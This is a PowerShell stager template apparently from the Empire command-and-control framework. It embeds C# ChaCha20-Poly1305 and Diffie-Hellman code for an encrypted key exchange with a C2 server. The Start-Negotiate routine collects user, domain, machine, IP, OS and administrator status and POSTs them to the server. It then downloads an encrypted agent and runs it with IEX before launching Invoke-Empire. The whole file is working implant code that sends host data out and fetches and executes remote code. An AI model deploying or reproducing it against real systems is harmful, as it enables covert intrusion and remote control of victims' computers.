#################################################################
# This file is a Jinja2 template.
#    Variables:
#        working_hours
#        kill_date
#        staging_key
#        profile
#################################################################

{% include 'http/comms.ps1' %}

[Reflection.Assembly]::LoadWithPartialName("System.Numerics") | Out-Null

$Script:pk = {{ agent_public_cert_key }}

$ChaChaSrc = @"
using System;

public static class ChaCha20Poly1305Ref
{
    const int ROUNDS = 20;

    static uint ROTL(uint v, int c) { return (v << c) | (v >> (32 - c)); }

    static void QuarterRound(ref uint a, ref uint b, ref uint c, ref uint d)
    {
        a += b; d ^= a; d = ROTL(d, 16);
        c += d; b ^= c; b = ROTL(b, 12);
        a += b; d ^= a; d = ROTL(d, 8);
        c += d; b ^= c; b = ROTL(b, 7);
    }

    static void U32To(byte[] dst, int off, uint v)
    {
        dst[off+0] = (byte)v;
        dst[off+1] = (byte)(v >> 8);
        dst[off+2] = (byte)(v >> 16);
        dst[off+3] = (byte)(v >> 24);
    }

    static void ChaChaBlock(byte[] key, uint counter, byte[] nonce, byte[] output) {
        uint[] s = new uint[16];
        s[0]=0x61707865; s[1]=0x3320646e; s[2]=0x79622d32; s[3]=0x6b206574;
        for (int i=0;i<8;i++) s[4+i] = U32(key, i*4);
        s[12]=counter;
        for (int i=0;i<3;i++) s[13+i] = U32(nonce, i*4);

        uint[] x = new uint[16];
        Array.Copy(s, x, 16);

        for (int i=0; i<ROUNDS; i+=2) {
            QuarterRound(ref x[0], ref x[4], ref x[8], ref x[12]);
            QuarterRound(ref x[1], ref x[5], ref x[9], ref x[13]);
            QuarterRound(ref x[2], ref x[6], ref x[10], ref x[14]);
            QuarterRound(ref x[3], ref x[7], ref x[11], ref x[15]);

            QuarterRound(ref x[0], ref x[5], ref x[10], ref x[15]);
            QuarterRound(ref x[1], ref x[6], ref x[11], ref x[12]);
            QuarterRound(ref x[2], ref x[7], ref x[8], ref x[13]);
            QuarterRound(ref x[3], ref x[4], ref x[9], ref x[14]);
        }

        for (int i=0;i<16;i++){
            uint v = x[i] + s[i];
            U32To(output, i*4, v);
        }
    }

    static void KeyStream(byte[] key, uint counter, byte[] nonce, byte[] dst) {
        byte[] block = new byte[64];
        int off=0;
        uint ctr = counter;
        while (off < dst.Length) {
            ChaChaBlock(key, ctr++, nonce, block);
            int n = Math.Min(64, dst.Length-off);
            Array.Copy(block, 0, dst, off, n);
            off += n;
        }
    }

    // Little-endian 32-bit load (safe)
    static uint LE32(byte[] b, int o) { return U32(b,o); }

    // Poly1305 tag over msg using one-time key 'otk' (32 bytes)
    static uint U32(byte[] b, int i) { return BitConverter.ToUInt32(b, i); }

    static void PolyClamp(byte[] r) {
        r[3]  &= 15;  r[7]  &= 15;  r[11] &= 15;  r[15] &= 15;
        r[4]  &= 252; r[8]  &= 252; r[12] &= 252;
    }

    static void Poly1305Tag(byte[] key, byte[] msg, byte[] tag) {
        var r = new byte[16];
        var s = new byte[16];
        Buffer.BlockCopy(key, 0,  r, 0, 16);
        Buffer.BlockCopy(key, 16, s, 0, 16);
        PolyClamp(r);

        // r as 26-bit limbs
        ulong r0 =  U32(r, 0)        & 0x3ffffffUL;
        ulong r1 = (U32(r, 3) >> 2)  & 0x3ffffffUL;
        ulong r2 = (U32(r, 6) >> 4)  & 0x3ffffffUL;
        ulong r3 = (U32(r, 9) >> 6)  & 0x3ffffffUL;
        ulong r4 = (U32(r,12) >> 8)  & 0x3ffffffUL;

        ulong s1 = r1 * 5, s2 = r2 * 5, s3 = r3 * 5, s4 = r4 * 5;
        ulong h0=0,h1=0,h2=0,h3=0,h4=0;

        int off = 0;
        while (off < msg.Length) {
            int n = Math.Min(16, msg.Length - off);
            var block = new byte[16];                    // zero padded by default
            Buffer.BlockCopy(msg, off, block, 0, n);
            off += n;

            // m as 26-bit limbs (+ hibit in t4)
            ulong t0 =  U32(block, 0)        & 0x3ffffffUL;
            ulong t1 = (U32(block, 3) >> 2)  & 0x3ffffffUL;
            ulong t2 = (U32(block, 6) >> 4)  & 0x3ffffffUL;
            ulong t3 = (U32(block, 9) >> 6)  & 0x3ffffffUL;
            ulong t4 = ((U32(block,12) >> 8) | (1u << 24)) & 0x3ffffffUL;

            h0 += t0; h1 += t1; h2 += t2; h3 += t3; h4 += t4;

            ulong d0 = h0*r0 + h1*s4 + h2*s3 + h3*s2 + h4*s1;
            ulong d1 = h0*r1 + h1*r0 + h2*s4 + h3*s3 + h4*s2;
            ulong d2 = h0*r2 + h1*r1 + h2*r0 + h3*s4 + h4*s3;
            ulong d3 = h0*r3 + h1*r2 + h2*r1 + h3*r0 + h4*s4;
            ulong d4 = h0*r4 + h1*r3 + h2*r2 + h3*r1 + h4*r0;

            // carry propagate
            ulong c = (d0 >> 26); h0 = d0 & 0x3ffffffUL; d1 += c;
            c = (d1 >> 26); h1 = d1 & 0x3ffffffUL; d2 += c;
            c = (d2 >> 26); h2 = d2 & 0x3ffffffUL; d3 += c;
            c = (d3 >> 26); h3 = d3 & 0x3ffffffUL; d4 += c;
            c = (d4 >> 26); h4 = d4 & 0x3ffffffUL; h0 += c * 5;
            c = (h0 >> 26); h0 &= 0x3ffffffUL; h1 += c;
        }

        // Compute h + -p and select
        ulong g0 = h0 + 5; ulong c2 = g0 >> 26; g0 &= 0x3ffffffUL;
        ulong g1 = h1 + c2; c2 = g1 >> 26; g1 &= 0x3ffffffUL;
        ulong g2 = h2 + c2; c2 = g2 >> 26; g2 &= 0x3ffffffUL;
        ulong g3 = h3 + c2; c2 = g3 >> 26; g3 &= 0x3ffffffUL;
        ulong g4 = h4 + c2 - (1UL<<26);

        ulong mask = (g4 >> 63) - 1;
        h0 = (h0 & ~mask) | (g0 & mask);
        h1 = (h1 & ~mask) | (g1 & mask);
        h2 = (h2 & ~mask) | (g2 & mask);
        h3 = (h3 & ~mask) | (g3 & mask);
        h4 = (h4 & ~mask) | (g4 & mask);

        // Pack into 128 bits (little-endian) using ALL four f-values
        ulong f0 = (h0      ) | (h1 << 26);
        ulong f1 = (h1 >> 6 ) | (h2 << 20);
        ulong f2 = (h2 >> 12) | (h3 << 14);
        ulong f3 = (h3 >> 18) | (h4 << 8 );

        ulong lo = ((ulong)(uint)f0) | (((ulong)(uint)f1) << 32);
        ulong hi = ((ulong)(uint)f2) | (((ulong)(uint)f3) << 32);

        // Add s (rfc: tag = (acc + s) mod 2^128)
        ulong s0 = BitConverter.ToUInt64(s, 0);
        ulong s11 = BitConverter.ToUInt64(s, 8);
        lo += s0;
        hi += s11 + ((lo < s0) ? 1UL : 0UL);

        var tb = new byte[16];
        Array.Copy(BitConverter.GetBytes(lo), 0, tb, 0, 8);
        Array.Copy(BitConverter.GetBytes(hi), 0, tb, 8, 8);
        Buffer.BlockCopy(tb, 0, tag, 0, 16);
    }

    static byte[] Pad16(int len)
    {
        int pad = (16 - (len % 16)) % 16;
        return new byte[pad];
    }

    public static byte[] Seal(byte[] key, byte[] nonce, byte[] pt, byte[] aad)
    {
        if (key == null || key.Length != 32) throw new ArgumentException("key 32B");
        if (nonce == null || nonce.Length != 12) throw new ArgumentException("nonce 12B");
        if (aad == null) aad = new byte[0];

        // Encrypt: keystream with counter=1
        byte[] ks = new byte[pt.Length];
        KeyStream(key, 1, nonce, ks);
        byte[] ct = new byte[pt.Length];
        for (int i=0;i<pt.Length;i++) ct[i] = (byte)(pt[i] ^ ks[i]);

        // Poly key: counter=0
        byte[] otk = new byte[32];
        KeyStream(key, 0, nonce, otk);

        // MAC data per RFC: aad || pad16(aad) || ct || pad16(ct) || LE64(len(aad)) || LE64(len(ct))
        byte[] aPad = Pad16(aad.Length);
        byte[] cPad = Pad16(ct.Length);
        byte[] mac = new byte[aad.Length + aPad.Length + ct.Length + cPad.Length + 16];
        int off=0;
        Array.Copy(aad, 0, mac, off, aad.Length); off += aad.Length;
        Array.Copy(aPad, 0, mac, off, aPad.Length); off += aPad.Length;
        Array.Copy(ct, 0, mac, off, ct.Length); off += ct.Length;
        Array.Copy(cPad, 0, mac, off, cPad.Length); off += cPad.Length;
        Array.Copy(BitConverter.GetBytes((ulong)aad.Length), 0, mac, off, 8); off += 8;
        Array.Copy(BitConverter.GetBytes((ulong)ct.Length), 0, mac, off, 8);

        byte[] tag = new byte[16];
        Poly1305Tag(otk, mac, tag);

        byte[] outBuf = new byte[ct.Length + 16];
        Array.Copy(ct, 0, outBuf, 0, ct.Length);
        Array.Copy(tag, 0, outBuf, ct.Length, 16);
        return outBuf;
    }

    public static byte[] Open(byte[] key, byte[] nonce, byte[] ct_and_tag, byte[] aad)
    {
        if (key == null || key.Length != 32) throw new ArgumentException("key 32B");
        if (nonce == null || nonce.Length != 12) throw new ArgumentException("nonce 12B");
        if (ct_and_tag == null || ct_and_tag.Length < 16) throw new ArgumentException("ct too short");
        if (aad == null) aad = new byte[0];

        int ctLen = ct_and_tag.Length - 16;
        byte[] ct = new byte[ctLen];
        byte[] tag = new byte[16];
        Array.Copy(ct_and_tag, 0, ct, 0, ctLen);
        Array.Copy(ct_and_tag, ctLen, tag, 0, 16);

        byte[] otk = new byte[32];
        KeyStream(key, 0, nonce, otk);

        byte[] aPad = Pad16(aad.Length);
        byte[] cPad = Pad16(ct.Length);
        byte[] mac = new byte[aad.Length + aPad.Length + ct.Length + cPad.Length + 16];
        int off=0;
        Array.Copy(aad, 0, mac, off, aad.Length); off += aad.Length;
        Array.Copy(aPad, 0, mac, off, aPad.Length); off += aPad.Length;
        Array.Copy(ct, 0, mac, off, ct.Length); off += ct.Length;
        Array.Copy(cPad, 0, mac, off, cPad.Length); off += cPad.Length;
        Array.Copy(BitConverter.GetBytes((ulong)aad.Length), 0, mac, off, 8); off += 8;
        Array.Copy(BitConverter.GetBytes((ulong)ct.Length), 0, mac, off, 8);

        byte[] calc = new byte[16];
        Poly1305Tag(otk, mac, calc);

        int diff = 0;
        for (int i=0;i<16;i++) diff |= (calc[i] ^ tag[i]);
        if (diff != 0) throw new Exception("tag mismatch");

        byte[] ks = new byte[ct.Length];
        KeyStream(key, 1, nonce, ks);
        byte[] pt = new byte[ct.Length];
        for (int i=0;i<ct.Length;i++) pt[i] = (byte)(ct[i] ^ ks[i]);
        return pt;
    }
}
"@

$DiffieHellman = @"
using System;
using System.Security.Cryptography;
using System.Numerics;
using System.Linq;
using System.Globalization;

public class DiffieHellman
{
    private BigInteger privateKey;
    public BigInteger publicKey { get; private set; }
    private BigInteger prime;
    private BigInteger generator;

    public byte[] PublicKeyBytes { get; private set; }
    public byte[] PrivateKeyBytes { get; private set; }
    public byte[] AesKey { get; private set; }

    public DiffieHellman()
    {
        generator = new BigInteger(2);
        var primeHex =
            "00" +
            "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B2" +
            "2514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7" +
            "EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE" +
            "45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F3562" +
            "08552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772" +
            "C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D22" +
            "61898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AE" +
            "A71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF" +
            "12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E" +
            "208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5" +
            "B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FB" +
            "ECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762" +
            "170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB" +
            "4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A5" +
            "3ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332" +
            "051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D" +
            "55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC" +
            "54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5D" +
            "A76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4" +
            "860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF";

        prime = BigInteger.Parse(primeHex, NumberStyles.HexNumber);

        privateKey = GenerateRandomBigInteger();
        PrivateKeyBytes = privateKey.ToByteArray();
        publicKey = BigInteger.ModPow(generator, privateKey, prime);
        PublicKeyBytes = publicKey.ToByteArray();
    }

    public BigInteger BigIntegerFromHexBytes(byte[] bytes)
    {
        if (bytes.Length > 0 && (bytes[0] & 0x80) != 0)
        {
            var tmp = new byte[bytes.Length + 1];
            Buffer.BlockCopy(bytes, 0, tmp, 1, bytes.Length);
            bytes = tmp; // tmp[0] is 0x00 by default
        }
        string hexString = BitConverter.ToString(bytes).Replace("-", "");
        return BigInteger.Parse(hexString, System.Globalization.NumberStyles.HexNumber);
    }

    public void GenerateSharedSecret(byte[] serverPubKey)
    {
        BigInteger bigIntValue = BigIntegerFromHexBytes(serverPubKey);

        BigInteger sharedSecret = BigInteger.ModPow(bigIntValue, privateKey, prime);

        byte[] rawSharedSecretBytes = sharedSecret.ToByteArray();
        Array.Reverse(rawSharedSecretBytes);

        // Always normalize to 6147 bytes
        int expectedLength = 6147;
        if (rawSharedSecretBytes.Length < expectedLength)
        {
            byte[] padded = new byte[expectedLength];
            Array.Copy(rawSharedSecretBytes, 0, padded,
                       expectedLength - rawSharedSecretBytes.Length,
                       rawSharedSecretBytes.Length);
            rawSharedSecretBytes = padded;
        }
        else if (rawSharedSecretBytes.Length > expectedLength)
        {
            // Truncate if too long (should rarely happen)
            rawSharedSecretBytes = rawSharedSecretBytes
                .Skip(rawSharedSecretBytes.Length - expectedLength).ToArray();
        }


        using (SHA256 sha256 = SHA256.Create())
        {
            AesKey = sha256.ComputeHash(rawSharedSecretBytes);
        }
    }

    private static BigInteger GenerateRandomBigInteger()
    {
        byte[] bytes = new byte[540];
        using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(bytes);
        }
        bytes[bytes.Length - 1] &= 0x7F; // force positive
        BigInteger randomInt = new BigInteger(bytes);
        if (randomInt == 0) return GenerateRandomBigInteger();
        return randomInt;
    }
}
"@

# compile first; stop on errors so you actually see them
$null = Add-Type -TypeDefinition $ChaChaSrc -Language CSharp -ErrorAction Stop
$refs = @("System.Numerics")
$null = Add-Type -TypeDefinition $DiffieHellman -Language CSharp -ReferencedAssemblies $refs -ErrorAction Stop

# Compat crypto-strong random bytes for PS5+PS7
function Get-CryptoRandomBytes {
    param([Parameter(Mandatory)][int]$Length)

    # allocate the buffer (correct syntax)
    $buf = [byte[]]::new($Length)   # or: New-Object byte[] $Length

    # PS7 / .NET 5+ supports Fill(); PS5 does not.
    $fill = [System.Security.Cryptography.RandomNumberGenerator].GetMethod('Fill', [type[]]@([byte[]]))
    if ($null -ne $fill) {
        [System.Security.Cryptography.RandomNumberGenerator]::Fill($buf)
    } else {
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        try { $rng.GetBytes($buf) } finally { $rng.Dispose() }
    }
    return $buf
}


# Ensure we have a 32-byte key (hash if necessary to match Python's 32B requirement)
function Normalize-Key([byte[]]$kb){
    if($kb.Length -eq 32){ return $kb }
    $sha = [System.Security.Cryptography.SHA256]::Create()
    return $sha.ComputeHash($kb)
}

# Build a ChaCha20-Poly1305 routing packet (nonce || AEAD(header) || encData)
function Build-ChaChaRoutingPacket {
    param(
        [byte[]]$StagingKeyBytes,
        [string] $SessionId8,
        [byte]   $Language = 1,
        [byte]   $Meta,
        [UInt16] $Additional = 0,
        [byte[]] $EncData = @()
    )
    $key   = Normalize-Key $StagingKeyBytes
    $nonce = Get-CryptoRandomBytes 12

    $sid = [System.Text.Encoding]::ASCII.GetBytes($SessionId8)            # 8 bytes
    $hdr = New-Object byte[] 16
    $sid.CopyTo($hdr, 0)
    $hdr[8]  = $Language
    $hdr[9]  = $Meta
    $hdr[10] = [byte]($Additional -band 0xFF)
    $hdr[11] = [byte](($Additional -shr 8) -band 0xFF)
    [BitConverter]::GetBytes([UInt32]$EncData.Length).CopyTo($hdr,12)

    $encHeader = [ChaCha20Poly1305Ref]::Seal($key, $nonce, $hdr, [byte[]]@())
    return $nonce + $encHeader + $EncData
}

# Decode ChaCha routing packets -> { sessionId : @(lang, meta, additional, encData) }
function Decode-ChaChaRoutingPacket {
    param(
        [Alias('PacketData')]
        [Parameter(Mandatory)]$RawData,
        [Parameter(Mandatory)][byte[]]$StagingKeyBytes
    )

    # Coerce to a flat byte[]
    $RawData = [byte[]](Convert-ToByteArrayDeep $RawData)
    if ($RawData.Length -lt 44) { return $null }

    $key = Normalize-Key $StagingKeyBytes
    $i = 0
    $out = @{}

    while (($RawData.Length - $i) -ge 44) {
        $nonce = [byte[]]::new(12)
        [Buffer]::BlockCopy($RawData, $i, $nonce, 0, 12)

        $aead = [byte[]]::new(32)  # 16B enc header + 16B tag
        [Buffer]::BlockCopy($RawData, $i + 12, $aead, 0, 32)

        try {
            $plain = [ChaCha20Poly1305Ref]::Open($key, $nonce, $aead, [byte[]]@())
        } catch {
            break
        }
        if (-not $plain -or $plain.Length -ne 16) { break }

        $sid  = [Text.Encoding]::ASCII.GetString($plain, 0, 8)
        $lang = $plain[8]
        $meta = $plain[9]
        $add  = [BitConverter]::ToUInt16($plain, 10)
        $lenU = [BitConverter]::ToUInt32($plain, 12)
        if ($lenU -gt [int]::MaxValue) { break }
        $len = [int]$lenU

        $start = $i + 44
        $end   = $start + $len
        if ($end -gt $RawData.Length) { break }

        $encData = [byte[]]::new($len)
        [Buffer]::BlockCopy($RawData, $start, $encData, 0, $len)

        $out[$sid] = @($lang, $meta, $add, $encData)
        $i = $end
    }

    return $out
}

function Aes-EncryptThenHmac {
    param([Parameter(Mandatory)][object]$Key, [Parameter(Mandatory)][byte[]]$Plain)
    $kb = Get-AesKeyBytes $Key
    $iv = Get-CryptoRandomBytes 16

    try { $aes = New-Object Security.Cryptography.AesCryptoServiceProvider } catch { $aes = New-Object Security.Cryptography.RijndaelManaged }
    $aes.Mode  = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key   = $kb
    $aes.IV    = $iv
    $ct = $aes.CreateEncryptor().TransformFinalBlock($Plain,0,$Plain.Length)
    $body = $iv + $ct
    $h = New-Object Security.Cryptography.HMACSHA256
    $h.Key = $kb
    $mac = ($h.ComputeHash($body))[0..9]
    return $body + $mac
}

function Decrypt-Bytes {
    param([Parameter(Mandatory)]$Key, [Parameter(Mandatory)][byte[]]$In)
    if(-not $In -or $In.Length -le 32){ return $null }

    $kb = Get-AesKeyBytes $Key            # <-- same normalization on decrypt
    $mac  = $In[-10..-1]
    $body = $In[0..($In.Length-11)]

    $h = New-Object Security.Cryptography.HMACSHA256
    $h.Key = $kb
    $exp = ($h.ComputeHash($body))[0..9]
    if(@(Compare-Object $mac $exp -Sync 0).Length -ne 0){ return $null }

    $iv = $body[0..15]
    $ct = $body[16..($body.Length-1)]
    try { $aes = New-Object Security.Cryptography.AesCryptoServiceProvider } catch { $aes = New-Object Security.Cryptography.RijndaelManaged }
    $aes.Mode = 'CBC'
    $aes.Padding='PKCS7'
    $aes.Key  = $kb
    $aes.IV   = $iv
    return $aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)
}

function Get-AesKeyBytes {
    param([Parameter(Mandatory)]$Key)

    if ($Key -is [byte[]]) {
        switch ($Key.Length) {
            16 { return $Key }
            24 { return $Key }
            32 { return $Key }
            default { return (Get-Sha256 $Key) }  # compress to 32 bytes
        }
    }

    $s = [string]$Key

    if ($s -match '^[\s]*0x?[0-9a-fA-F]+[\s]*$' -and (($s -replace '^\s*0x','' -replace '\s','').Length % 2 -eq 0)) {
        $b = Convert-HexStringToBytes $s
        return ($(switch ($b.Length) {16{$b} 24{$b} 32{$b} default{ Get-Sha256 $b } }))
    }

    try {
        $b64 = [Convert]::FromBase64String($s)
        return ($(switch ($b64.Length) {16{$b64} 24{$b64} 32{$b64} default{ Get-Sha256 $b64 } }))
    } catch { }

    return (Get-Sha256 ([Text.Encoding]::UTF8.GetBytes($s)))
}

function Convert-HexStringToBytes {
    param([Parameter(Mandatory)][string]$Hex)
    $h = $Hex.Trim()
    if ($h -match '^0x') { $h = $h.Substring(2) }
    if ($h.Length % 2 -ne 0) { throw "Hex string must have even length." }
    if ($h -notmatch '^[0-9a-fA-F]+$') { throw "Invalid hex string." }
    $bytes = New-Object byte[] ($h.Length/2)
    for ($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = [Convert]::ToByte($h.Substring($i*2,2),16)
    }
    return $bytes
}

function Get-Sha256 {
    param([Parameter(Mandatory)][byte[]]$Bytes)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try { return $sha.ComputeHash($Bytes) } finally { $sha.Dispose() }
}

function Convert-ToByteArrayDeep {
    param([Parameter(Mandatory)]$Data)

    if ($Data -is [byte[]]) { return $Data }
    if ($Data -is [System.IO.MemoryStream]) { return $Data.ToArray() }

    $out = [System.Collections.Generic.List[byte]]::new()

    function add([object]$x) {
        if     ($x -is [byte])   { $out.Add($x); return }
        elseif ($x -is [sbyte])  { $out.Add([byte]([sbyte]$x)); return }
        elseif ($x -is [int])    { $out.Add([byte]$x); return }
        elseif ($x -is [uint32]) { $out.Add([byte]$x); return }
        elseif ($x -is [byte[]]) { $out.AddRange($x); return }
        elseif ($x -is [System.IO.MemoryStream]) { $out.AddRange($x.ToArray()); return }
        elseif ($x -is [System.Collections.IEnumerable] -and -not ($x -is [string])) {
            foreach ($y in $x) { add $y }
            return
        }
        else { throw "Unsupported element type: $($x.GetType().FullName)" }
    }

    add $Data
    return $out.ToArray()
}

function Start-Negotiate {
    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)

    # make sure the appropriate assemblies are loaded
    [Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null
    [Reflection.Assembly]::LoadWithPartialName("System.Core")     | Out-Null

    $ErrorActionPreference = "SilentlyContinue"
    $e  = [Text.Encoding]::UTF8
    $SKB = $e.GetBytes($SK)

    # ---- Build Stage0 (client -> server) : DH client pub || agent_cert(64) ----
    # 1) Create DH instance and grab the public key bytes (little-endian)
    $dh = [DiffieHellman]::new()
    $pubLE = $dh.PublicKeyBytes   # little-endian, two's complement

    # 2) Convert to big-endian, fixed length (768 bytes)
    function To-BigEndianFixedFromLE {
        param(
            [Parameter(Mandatory)][byte[]]$LittleEndian,
            [Parameter(Mandatory)][int]$Length
        )
        # Strip the sign-extension byte if present (LE puts it at the END)
        if ($LittleEndian.Length -gt 0 -and $LittleEndian[-1] -eq 0x00) {
            $LittleEndian = $LittleEndian[0..($LittleEndian.Length-2)]
        }

        # Reverse to big-endian
        $be = $LittleEndian.Clone()
        [Array]::Reverse($be)

        # Pad/truncate to fixed size
        if ($be.Length -gt $Length) {
            $be = $be[($be.Length - $Length)..($be.Length - 1)]
        } elseif ($be.Length -lt $Length) {
            $pad = [byte[]]::new($Length - $be.Length)
            $be = $pad + $be
        }
        return ,$be
    }

    $cpBE768 = To-BigEndianFixedFromLE -LittleEndian $pubLE -Length 768
    $mbytes = [System.Text.Encoding]::ASCII.GetBytes("SIGNATURE")

    # 3) Concatenate with your 64-byte cert
    $agentCert  = signature_unsafe $mbytes $Script:skbytes $Script:pk
    [byte[]]$stage1Msg = $cpBE768 + $agentCert

    # AES-CBC + HMAC with staging key
    $eb = Aes-EncryptThenHmac -Key $SKB -Plain $stage1Msg

    # prepare webclient
    if(-not $wc){
        $wc = New-Object System.Net.WebClient
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
    }
    if ($Script:Proxy) { $wc.Proxy = $Script:Proxy }
    $wc.Headers.Clear()
    $wc.Headers.Add('User-Agent', $UA)

    # session id (8 bytes ASCII)
    $ID='00000000'

    # stage_1: ChaCha20-Poly1305 routing with AES/HMAC body
    $chachaPkt = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 2 -Additional 0 -EncData $eb
    $raw = $wc.UploadData($s + "/{{ stage_1 }}", "POST", $chachaPkt)

    # parse routing
    $pktMap = Decode-ChaChaRoutingPacket -RawData $raw -StagingKeyBytes $SKB
    if(-not $pktMap){ return }

    # Take the session id the server actually used and adopt it
    $ID = $pktMap.Keys | Select-Object -First 1
    $fields = $pktMap[$ID]; if(-not $fields){ $firstKey = $pktMap.Keys | Select-Object -First 1; $fields = $pktMap[$firstKey] }
    $EncryptedPayloadBytes = [byte[]]$fields[3]

    # decrypt (staging key)
    $plain = Decrypt-Bytes -Key $SKB -In $EncryptedPayloadBytes
    if(-not $plain){ return }  # HMAC failed or data malformed

    # server: nonce(16) || server_pub || server_cert(64)
    if($plain.Length -lt 16+64){ return }
    $nonce = $plain[0..15]
    $serverPubBytes = $plain[16..($plain.Length-65)]
    $serverCert     = $plain[($plain.Length-64)..($plain.Length-1)]
    try{
        $result = checkvalid $serverCert $mbytes $Script:serverPubBytes

    }
    catch{
        # kill the agent if the server cert isn't valid
        exit 1
    }
    $serverPubRaw = $serverPubBytes

    $dh.GenerateSharedSecret($serverPubBytes)

    # 32-byte key derived via SHA-256 of the shared secret bytes (from your class)
    $sessionkey = $dh.AesKey
    $Script:SessionKey = $sessionkey
    $sessionkeyb64 = [Convert]::ToBase64String($sessionkey)

    # ---- Stage2: send sysinfo with AES/HMAC(SessionKey) ----
    # Nonce is ASCII digits (e.g., '5348601603889370'); parse, increment, stringify
    $nonceText = [Text.Encoding]::ASCII.GetString($nonce)
    if ($nonceText -notmatch '^\d+$') { return }
    $nonceStr = ([bigint]$nonceText + 1).ToString()

    # collect sysinfo (same layout you had)
    $i = "$nonceStr|$s|$([Environment]::UserDomainName)|$([Environment]::UserName)|$([Environment]::MachineName)"
    try{
        $p=(Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress} | Select-Object -ExpandProperty IPAddress)
    } catch { $p = "[FAILED]" }
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6]; if(-not $ip -or $ip.Trim() -eq ''){ $ip='0.0.0.0' }
    $i += "|$ip"
    try{ $i += '|' + (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] } catch{ $i += '|[FAILED]' }
    if(([Environment]::UserName).ToLower() -eq 'system'){ $i += '|True' }
    else {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        $i += '|' + $isAdmin
    }
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    $i += "|$($proc.ProcessName)|$($proc.Id)"
    $i += "|powershell|$($PSVersionTable.PSVersion.Major)"
    $i += "|$env:PROCESSOR_ARCHITECTURE"

    $ib2 = $e.GetBytes($i)
    $eb2 = Aes-EncryptThenHmac -Key $SessionKey -Plain $ib2

    $wc.Headers.Clear()
    $wc.Headers.Add('User-Agent', $UA)
    $wc.Headers.Add('Hop-Name', $hop)

    # stage_2: ChaCha20-Poly1305 routing with AES/HMAC(SessionKey) body
    $chachaPkt2 = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
    $raw2 = $wc.UploadData($s + "/{{ stage_2 }}", "POST", $chachaPkt2)

    # receive agent, decrypt with SessionKey, IEX
    $pktMap2 = Decode-ChaChaRoutingPacket -RawData $raw2 -StagingKeyBytes $SKB
    if(-not $pktMap2){ return }
    $fields2 = $pktMap2[$ID]; if(-not $fields2){ $firstKey = $pktMap2.Keys | Select-Object -First 1; $fields2 = $pktMap2[$firstKey] }
    $agentEnc = [byte[]]$fields2[3]
    $agentBytes = Decrypt-Bytes -Key $SessionKey -In $agentEnc
    if($agentBytes){
        IEX ($e.GetString($agentBytes))
    }

    # cleanup
    $wc=$null;$raw=$null;$raw2=$null;$eb=$null;$eb2=$null;$ib2=$null;$agentBytes=$null
    [GC]::Collect()

    # hand off to your main runtime
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $SessionKeyB64 -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
}
# $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
Start-Negotiate -s "$ser" -SK '{{ staging_key }}' -UA $u -hop "$hop";
